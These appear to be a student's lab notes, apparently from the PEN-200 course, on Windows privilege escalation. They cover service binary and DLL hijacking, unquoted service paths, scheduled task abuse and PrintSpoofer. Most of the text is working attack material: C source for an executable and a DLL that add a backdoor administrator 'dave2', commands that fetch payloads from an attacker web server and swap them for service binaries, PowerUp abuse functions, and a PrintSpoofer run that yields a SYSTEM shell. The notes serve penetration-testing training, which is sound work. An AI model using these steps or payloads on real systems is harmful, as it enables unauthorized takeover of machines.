
> A Windows Service is a long-running background executable or application managed by the Service Control Manager and is similar to the concept of daemons on Unix systems.
> Windows services can be managed by the Services snap-in, PowerShell, or the **sc.exe** command line tool.
> Windows uses the LocalSystem (includes the SIDs of NT AUTHORITY\SYSTEM and BUILTIN\Administrators in its token), Network Service, and Local Service user accounts to run its own services.
> Users or programs creating a service can choose either one of those accounts, a domain user, or a local user.

# Service Binary Hijacking

### Scenario
Software developer creates a program and installs an application as a Windows service.
During the installation, the developer does not secure the permissions of the program, allowing full Read and Write access to all members of the Users group.
As a result, a lower-privileged user could replace the program with a malicious one.
To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine.
Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as _LocalSystem_.

Get a list of installed services
```powershell
Get-Service
```

Get a list of all running services
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
	Name                      State   PathName
	----                      -----   --------
	Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
	Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
	AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
	AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
	Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
	BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
	BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
	BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
	...
	mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	...
```

List of services running *not* in `c:\windows\system32` path
```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}
	Name          State   PathName
	----          -----   --------
	Apache2.4     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
	BetaService   Running C:\Users\steve\Documents\BetaServ.exe
	edgeupdate    Running "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
	LSM           Running
	mysql         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	uhssvc        Running "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
	VGAuthService Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
	VMTools       Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
	WinDefend     Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe"
```

These services/ binaries stand out as they're not running from the System32 path.
- Means they're user-installed and the software developer is in charge of the directory structure as well as permissions of the software

To enumerate the binary's permissions, use **icacls**.

Will output the current principles and their permission mask:

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

```powershell
PS C:\Users\dave> icacls "c:\xampp\apache\bin\httpd.exe"
	c:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
	                              NT AUTHORITY\SYSTEM:(F)
	                              BUILTIN\Users:(RX)
	                              NT AUTHORITY\Authenticated Users:(RX)


PS C:\Users\dave> icacls "c:\xampp\mysql\bin\mysqld.exe"
	c:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
	                              NT AUTHORITY\SYSTEM:(F)
	                              BUILTIN\Users:(F)
```
	- httpd service - users have read and execute access
	- mysqld service - users have full access - allows us to write & modify (aka replace) the file

##### adduser.c
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net localgroup 'Remote Desktop Users' dave2 /add");
  
  return 0;
}
```
	- Will add a new user *dave2* with password *password123!*
	- Add new user to Administrators group
	- Will add new user to RDP group

Cross-compile & start a python server
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

python3 -m http.server 80
```

Download to victim machine and replace mysqld.exe
```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

As most services are only managed by administrative users, we won't have permission to stop/ restart it.

However, If the service _Startup Type_ is set to "Automatic", we may be able to restart the service by rebooting the machine.
- Check start mode
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
	Name  StartMode
	----  ---------
	mysql Auto
```

- Check user's privileges for reboot
```powershell
PS C:\Users\dave> whoami /priv
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                          State
	============================= ==================================== ========
	SeSecurityPrivilege           Manage auditing and security log     Disabled
	SeShutdownPrivilege           Shut down the system                 Disabled     #<-- NOTE
	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
	SeUndockPrivilege             Remove computer from docking station Disabled
	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
	SeTimeZonePrivilege           Change the time zone                 Disabled
```

> The _Disabled_ state only indicates if the privilege is currently enabled for the running process. In our case, it means that whoami has not requested and is not currently using the *SeShutdownPrivilege* privilege.

- Issue a reboot
```powershell
shutdown /r /t 0
```

Can verify it worked by RDP'ing back in as `dave` and check
```powershell
PS C:\Users\dave> Get-LocalGroupMember administrators

	ObjectClass Name                      PrincipalSource
	----------- ----                      ---------------
	User        CLIENTWK220\Administrator Local
	User        CLIENTWK220\BackupAdmin   Local
	User        CLIENTWK220\dave2         Local
	User        CLIENTWK220\daveadmin     Local
	User        CLIENTWK220\offsec        Local
```

Will now need to switch over to new user `dave2` AND start a powershell terminal using Admin privs
```powershell
# Switch to new user
PS C:\Users\dave> runAs /user:dave2 powershell.exe

# Open PowerShell 'As Admin'
PS C:\Windows\system32> Start-Process powershell.exe -Verb runAs
```

## Automated PowerUp.ps1

- Stage [PowerUp.ps1](Tools.md#PowerUp.ps1) tool
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

- Download on victim and run
```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass

PS C:\Users\dave>  . .\PowerUp.ps1

# Display services the current user can modify, such as the service binary or configuration files.
PS C:\Users\dave> Get-ModifiableServiceFile

	...
	ServiceName                     : mysql
	Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
	ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
	ModifiableFileIdentityReference : BUILTIN\Users
	StartName                       : LocalSystem
	AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
	CanRestart                      : False
```
	- Shows us mysql is vulnerable


> PowerUp.ps1 also includes an *AbuseFunction* - a built-in function to replace the binary and, w/ sufficient perms, restart it.
> Default behavior is to create a new local user called `john` with the password `Password123!` & add it to the Admin group

Attempting to use the function, we'll get an error
```powershell
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
	Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
	modifiable by the current user.
	At C:\Users\dave\PowerUp.ps1:2178 char:13
	+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
	+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
	    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
	   mysql' for service mysql not modifiable by the current user.
```
	- States the service binary is not modifiable by the current user, even though we've established we have Full Access perms

PowerUp's code shows that *Get-ModifiablePath* is used to return modifiable paths for the current user - which provides an empty result for us, hence the error.

- Troubleshoot & examine why the error's being thrown
	1. Try the service binary path without any  args for **Get-ModifiablePath**
	2. Add another arg to check if the function still provides the right output
	3. Use an arg w/ a path inside
```powershell
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}

PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 

PS C:\Users\dave> $ModifiableFiles
```
	- While the service binary w/ or w/o another arg works as expected, a path as an argument creates an empty result.

For this particular case, it'd be best to go for a manual exploitation


# Service DLL Hijacking

Without proper perms to abuse service binary hijacking, we can attempt to hijack a service's DLL load.

*Dynamic Link Libraries* provide functionality to programs or the OS.
- Contain code or resources (like icon files), for other executable files or objects to use.
- Provide a way for developers to use and integrate already existing functionality w/o 'reinventing the wheel' (think python libraries)
- Used to store functionality . by several components.
- Called *Shared Objects* on Unix systems

Several methods we can use:
- Overwrite a DLL the service binary uses
	- Though, service may not work as expected as the original DLL's functionality is missing
		- Most cases, still can lead to code execution
- Hijack the DLL *search order*
	- Defined by MS & determines what to inspect first when searching for DLLs.

> By default, all current Win versions have 'safe DLL search mode' enabled
> 	Implemented due to the high number of DLL hijacking vectors and ensures that DLLs are more difficult to hijack

#### Standard DLL search order
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

> When Safe DLL Search Mode is disabled, the current directory (5 above) is searched at position 2 - right after the app's dir

#### Exploitation
Due to either a flawed installation process or updates, a DLL is missing, and the binary attempts to load the DLL which doesn't exist on the system.

To exploit, place a malicious DLL (with the name of the missing DLL) in a path of the Search Order so it executes when the binary is started.

- Start by enumerating the services and check permissions on these files
```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\windows\system32\*')}

	Name          State   PathName
	----          -----   --------
	Apache2.4     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
	BetaService   Running C:\Users\steve\Documents\BetaServ.exe
	edgeupdate    Running "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
	LSM           Running
	mysql         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	uhssvc        Running "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
	VGAuthService Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
	VMTools       Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
	WinDefend     Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe"
```

- Check permissions on the binary file
```powershell
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
	.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
		 BUILTIN\Administrators:(F)
		 CLIENTWK220\steve:(RX)
		 CLIENTWK220\offsec:(F)
```

- Start up Procmon to observe any calls to missing DLLs
	- (**procmon64.exe** is in the C:\\tools\\procmon\\ directory)
- Add filter for service
	- Add > Apply > Ok
![](procmon_filter.png)

- Restart the service to capture processes
```powershell
PS C:\Users\steve> Restart-Service BetaService
	WARNING: Waiting for service 'BetaService (BetaService)' to start...
```

> Can add filters to narrow down further:
	- Operation - Contains - Reg - then - Include
	- Result - Is - NAME NOT FOUND - then - Include

![](procmon_results.png)
- As seen, the consecutive function calls follow the DLL search order starting w/ the app's dir & ending w/ the directories in the PATH env variable
- Confirmed
```powershell
PS C:\Users\steve> $env:path
	C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
```

As one of the directories is under our control, we can attempt to write our own malicious DLL in `C:\Users\steve\Documents`

#### DLL explanation

Each DLL can have an optional *entry point function* called *DllMain*
- Executed when processes or threads attach the DLL
- Generally contains four cases
	- Commonly used to perform initialization tasks for the DLL or related to exiting the DLL (when the DLL is loaded or unloaded by a process or thread)
		1. DLL_PROCESS_ATTACH   
		2. DLL_THREAD_ATTACH
		3. DLL_THREAD_DETACH
		4. DLL_PROCESS_DETACH
- If there isn't a *DllMain* entry point function, it only provides resources

```C++
# DLL code example
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

As *DLL_PROCESS_ATTACH* is used when a process is loading the DLL, that's the case we'll use

- Reuse the adduser.c code, adding *include* statement for the header file **windows.h**
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

- Cross compile
```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

- Transfer to victim computer and run
```powershell
PS C:\Users\steve> cd Documents

PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll

PS C:\Users\steve\Documents> Restart-Service BetaService
	WARNING: Waiting for service 'BetaService (BetaService)' to start...

# Verify user was added and given Administrator group privs
PS C:\Users\steve\Documents> net user
	User accounts for \\CLIENTWK220
	
	-------------------------------------------------------------------------------
	Administrator            BackupAdmin              dave
	dave2                    daveadmin                DefaultAccount
...

PS C:\Users\steve\Documents> net localgroup administrators
	...
	Administrator
	BackupAdmin
	dave2
	...
```

- Once done can switch to admin user `dave2` within powershell and elevate powershell prompt to High Mandatory Level
```powershell
PS C:\Users\steve\Documents> runAs /user:dave2 powershell.exe
	Enter the password for dave2:
	Attempting to start powershell.exe as user "CLIENTWK220\dave2" ...

# In next powershell prompt, verify user, integrity level, and elevate
PS C:\Windows\system32> whoami
	clientwk220\dave2

PS C:\Windows\system32> whoami /groups
	GROUP INFORMATION
	-----------------
	
	Group Name                                                    Type             SID          Attributes                  
	============================================================= ================ ============ ==================================================
	...
	Mandatory Label\Medium Mandatory Level


PS C:\Windows\system32> Start-Process powershell.exe -Verb RunAs

# In next powershell prompt, verify integrity level
PS C:\Windows\system32> whoami /groups
	GROUP INFORMATION
	-----------------
	
	Group Name                                                    Type             SID          Attributes
	============================================================= ================ ============ ===============================================================
	...
	Mandatory Label\High Mandatory Level
```


# Unquoted Service Paths

Can be abused when the path of a service/ app contains one or more spaces and is not enclosed within quotes.
- Can be interpreted in various ways because it's unclear to the *CreateProcess* function what to use for the *IpApplicationName* parameter
	- Where the file name ends and the arguments begin.
	- Function starts interpreting the path from left to right until a space is reached.
	- For every spact in the file path, the function uses the preceding part as the file name by adding **.exe** & the rest as args.
- Useful when we have write permissions to a service's main directory & subdirectories but cannot replace files within them.  
  
Example:  
A service stored in a path such as `C:\Program Files\My Program\My Service\service.exe`

If the service path is stored unquoted, whenever Windows starts the service it will attempt to run an executable from the following paths:  
  
	C:\Program.exe  
	C:\Program Files\My.exe  
	C:\Program Files\My Program\My.exe  
	C:\Program Files\My Program\My service\service.exe  
  
So, could craft the malicious binary, and
- name it **Program.exe** and store in `C:\` directory
- name it **My.exe** and store it in  `C:\Program Files\` directory
- name it **My.exe** and store it in `C:\Program Files\My Program\`
	- First two would likely require perms a standard user wouldn't have
	- Third option more likely as it's the software's main directory.
		- If admin user or developer set the perms for this dir too open, we can put our malicious binary there.
  
- Enumerate running and stopped services
```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike 'C:\windows\system32\*'}
	Name                      State   PathName
	----                      -----   --------
	...
	GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
	...
```

- More effective way to ID spaces in the paths and missing quotes is by using **wmic** in a **cmd** terminal
	- Also a great way to avoid escaping issues for the quote in the second *findstr* command
		- *Could* use the *Select-String* cmdlet in PowerShell
```powershell
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
	Name                                       PathName                                                                     
	...                                                                                                         
	GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
	- Service - Obtain service information
	- get Retrieve only these specific property values
	- First findstr:
		- /i - Case-insensitive
		- /v - Only print lines that don't match
		- "C:\Windows\\" - Show only services with a binary path outside the Windows directory.
	- Second findstr:
		- """ - Print only matches without quotes.

- Check our user can start & stop the service
```powershell
PS C:\Users\steve> Start-Service GammaService
	WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```
	- No errors meand we're GTG - no reboot needed

- Check access rights in the app's paths
```powershell
PS C:\Users\steve> icacls "C:\"
	...
	    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
	    NT AUTHORITY\Authenticated Users:(AD)
	...


PS C:\Users\steve>icacls "C:\Program Files"
	...
		 BUILTIN\Users:(RX)
		 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
	 ...

PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
	...
		 BUILTIN\Users:(OI)(CI)(RX,W)
	...
```
	- As thought, only directory `steve` has perms for (Write) is `C:\Program Files\ Enterprise Apps`

- Replace previously created **adduser.exe** from [Binary Hijacking section](16.2%20-%20PrivEsc%20Windows%20Services.md#adduser.c)
	- Path of binary for reference `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`
```powershell
PS C:\Users\steve> iwr -uri http://192.168.45.238/adduser.exe -OutFile Current.exe

PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

- Restart service
```powershell
PS C:\Users\steve> Start-Service GammaService
	Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
	service GammaService on computer '.'.
	At line:1 char:1
	+ Start-Service GammaService
	+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
	    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
	   ServiceCommandException
	    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand

PS C:\Users\steve> net user
	User accounts for \\CLIENTWK220
	-------------------------------------------------------------------------------
	...
	dave2                    daveadmin                DefaultAccount
	...

PS C:\Users\steve> net localgroup administrators
	Alias name     administrators
	...
	-------------------------------------------------------------------------------
	...
	dave2
	...
```
	- The error message received when starting the service is due to the fact that our adduser.exe (renamed Current.exe here) doesn't accept the parameters leftover from the original service path (`Version\GammaServ.exe`)
	- We can still verify that the backdoor user was added.

Note: to restore functionality to the service
- Stop the service
- Delete our binary **Current.exe**
- Restart the service


## Automated PowerUp

- Transfer PowerUp, and get a list of all Unquoted Services
```powershell
PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass
...

PS C:\Users\dave> . .\PowerUp.ps1

PS C:\Users\dave> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
```
	- Shows GammaService is vulnerable

- Abuse
```powershell
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
	ServiceName  Path                                         Command
	-----------  ----                                         -------
	GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...
	
	PS C:\Users\steve> Restart-Service GammaService
	WARNING: Waiting for service 'GammaService (GammaService)' to start...
	Restart-Service : Failed to start service 'GammaService (GammaService)'.
	At line:1 char:1
	+ Restart-Service GammaService
	+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
	   , ServiceCommandException
	    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand


PS C:\Users\steve> net user
	User accounts for \\CLIENTWK220
	
	-------------------------------------------------------------------------------
	Administrator            BackupAdmin              dave
	dave2                    daveadmin                DefaultAccount
	Guest                    john            offsec
	steve                    WDAGUtilityAccount
	
	The command completed successfully.


PS C:\Users\steve> net localgroup administrators
	...
	john
	...
```


# Scheduled Tasks

Defined with one or more triggers and actions
- Categorized in the _Conditions_, _Settings_, and _General_ menu tabs of a task's property.
- Trigger can be
	- Specific date
	- At startup
	- At login
	- A Windows *event*
- An action specifies which which program or script to run.


Vital info needed to collect about a scheduled task to determine privesc vectors
- As which user account (principal) does this task get executed?
	- Will the task lead to privesc in the first place
- What triggers are specified for the task?
	- Important to determine whether the task will run during testing.
		- If unable to attempt privesc via a scheduled task, mention this finding in a penetration testing report for a client.
- What actions are executed when one or more of these triggers are met?
	- Determines how we can perform the attack
		- Replace binary, add missing DLL, etc


### Exploit

- Get a list of scheduled tasks
```powershell
schtasks /query /fo LIST /v
```
	- Biggest issue is how long this list can be.

- Smarter way:   Search specifically for a scheduled task based on Author to start narrowing down search
	- Remove all Microsoft* authors first
	- Then display details for specific task
```powershell
#Search by Author
PS C:\Users\steve> Get-ScheduledTask | select-object TaskName,Author | Where-Object {$_.Author -notlike "Microsoft*"}
	TaskName                                   Author
	--------                                   ------
	CacheCleanup                               CLIENTWK220\daveadmin
	.NET Framework NGEN v4.0.30319
	.NET Framework NGEN v4.0.30319 64
	.NET Framework NGEN v4.0.30319 64 Critical
	.NET Framework NGEN v4.0.30319 Critical
	Backup                                     $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-600)
	Pre-staged app cleanup
	BitLocker Encrypt All Drives
	BitLocker MDM policy Refresh
	SyspartRepair
	LicenseImdsIntegration                     $(@%SystemRoot%\system32\fclip.exe,-100)
	...
	SpaceManagerTask                           $(@%SystemRoot%\system32\spaceman.exe,-2)
	MaintenanceTasks                           $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-600)
	...

# Get location of task & next run time
PS C:\Users\steve>  Get-ScheduledTask -TaskName "CacheCleanup" | Get-ScheduledTaskInfo
	LastRunTime        : 4/26/2024 10:23:23 AM
	LastTaskResult     : 0
	NextRunTime        : 4/26/2024 10:24:24 AM
	NumberOfMissedRuns : 0
	TaskName           : CacheCleanup
	TaskPath           : \Microsoft\
	PSComputerName     :

# Get verbose info on specific task
PS C:\Users\steve> schtasks /query /tn "\Microsoft\CacheCleanup" /fo LIST /v
	Folder: \Microsoft
	HostName:                             CLIENTWK220
	TaskName:                             \Microsoft\CacheCleanup
	Next Run Time:                        4/26/2024 10:14:21 AM
	Status:                               Ready
	Logon Mode:                           Interactive/Background
	Last Run Time:                        4/26/2024 10:13:31 AM
	Last Result:                          0
	Author:                               CLIENTWK220\daveadmin
	Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe     #<--NOTE
	Start In:                             C:\Users\steve\Pictures
	Comment:                              N/A
	Scheduled Task State:                 Enabled
	Idle Time:                            Disabled
	Power Management:                     Stop On Battery Mode
	Run As User:                          daveadmin                    #<--NOTE
	Delete Task If Not Rescheduled:       Disabled
	Stop Task If Runs X Hours and X Mins: Disabled
	Schedule:                             Scheduling data is not available in this format.
	Schedule Type:                        One Time Only, Minute
	Start Time:                           7:37:21 AM
	Start Date:                           7/4/2022
	End Date:                             N/A
	Days:                                 N/A
	Months:                               N/A
	Repeat: Every:                        0 Hour(s), 1 Minute(s)
	Repeat: Until: Time:                  None
	Repeat: Until: Duration:              Disabled
	Repeat: Stop If Still Running:        Disabled
```

- Verify permissions of the binary
```powershell
PS C:\Users\steve> icacls .\Pictures\BackendCacheCleanup.exe
	.\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
		   BUILTIN\Administrators:(I)(F)
		   CLIENTWK220\steve:(I)(F)
		   CLIENTWK220\offsec:(I)(F)
```

With Full permissions, can now exploit like Services
```powershell
# Move into binary's directory
PS C:\Users\steve> cd .\Pictures\
# Save og binary as a backup
PS C:\Users\steve\Pictures> move .\BackendCacheCleanup.exe .\BackendCacheCleanup.exe.bak
# Download replacement
PS C:\Users\steve\Pictures> iwr -uri http://192.168.45.207/adduser.exe -OutFile .\BackendCacheCleanup.exe
```

Once the scheduled task is executed again, the `adduser.exe` replacement binary should run & `dave2` should be created
- Looking at NextRunTime and LastRunTime from `Get-ScheduledTaskInfo` output, we can surmise it'll only take a minute or so
```powershell
PS C:\Users\steve\Pictures> net user
	User accounts for \\CLIENTWK220
	-------------------------------------------------------------------------------
	Administrator            BackupAdmin              dave
	dave2                    daveadmin                DefaultAccount
	...
```

- Exploit like usual
```powershell
# First PS terminal
PS C:\Users\steve\Pictures> RunAs /user:dave2 powershell.exe
	Enter the password for dave2:
	Attempting to start powershell.exe as user "CLIENTWK220\dave2" ...

# Second PS terminal
Start-Process powershell.exe -Verb RunAs

# Third PS terminal
type C:\Users\daveadmin\desktop\flag.txt
```



# _SeImpersonatePrivilege_

Offers the possibility to leverage a token with another security context
- A user with this privilege can perform operations in the security context of another user account under the right circumstances
- Used to prevent unauthorized users from creating a service or server application to impersonating clients connecting to it
	- Rare to find, but still useful
- Default assigned to:
	- _Administrators_ group
	- The device's _LOCAL SERVICE_, _NETWORK SERVICE_, and _SERVICE_ accounts


> Other privileges that may lead to privilege escalation are _SeBackupPrivilege_, _SeAssignPrimaryToken_, _SeLoadDriver_, and _SeDebug_.


## Named Pipes
One method for local or remote [_Inter-Process Communication_](https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276/abusing-other-windows-components-47209/using-exploits-45283#fn-local_id_335-6) in Windows
- Offer the functionality of two unrelated processes sharing and transferring data with each other.
- Named pipe server can create a named pipe to which a named pipe client can connect via the specified name
- Server and client don't need to reside on the same system.

Once a client connects to a named pipe, the server can leverage _SeImpersonatePrivilege_ to impersonate this client after capturing the authentication from the connection process

Abuse by
- Finding a privileged process and coerce it into connecting to a controlled named pipe.

With _SeImpersonatePrivilege_ assigned, we can then impersonate the user account connecting to the named pipe and perform operations in its security context

### Exploit - [PrintSpoofer](Tools.md#PrintSpoofer)

Use a tool named **PrintSpoofer** created by _itm4n_, which implements a variation of the _printer bug_ to coerce _NT AUTHORITY\\SYSTEM_ into connecting to a controlled named pipe.
We can use this tool in situations where we have code execution as a user with the privilege _SeImpersonatePrivilege_ to execute commands or obtain an interactive shell as _NT AUTHORITY\\SYSTEM_.

- Check user's privileges
```powershell
C:\Users\dave>whoami /priv
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State   
	============================= ========================================= ========
	SeSecurityPrivilege           Manage auditing and security log          Disabled
	SeShutdownPrivilege           Shut down the system                      Disabled
	...
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
	...
```

- Download PrintSpoofer & serve on attacker
```bash
Z

python3 -m http.server 80
```

- Download and exploit
```powershell
C:\Users\dave>powershell                                                                                        
	Windows PowerShell
	Copyright (C) Microsoft Corporation. All rights reserved.
	
	Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.45.207/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe

PS C:\Users\dave> . .\PrintSpoofer64.exe -i -c powershell.exe
	[+] Found privilege: SeImpersonatePrivilege
	[+] Named pipe listening...
	[+] CreateProcessAsUser() OK
	Windows PowerShell
	Copyright (C) Microsoft Corporation. All rights reserved.
	
	Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
	nt authority\system
```


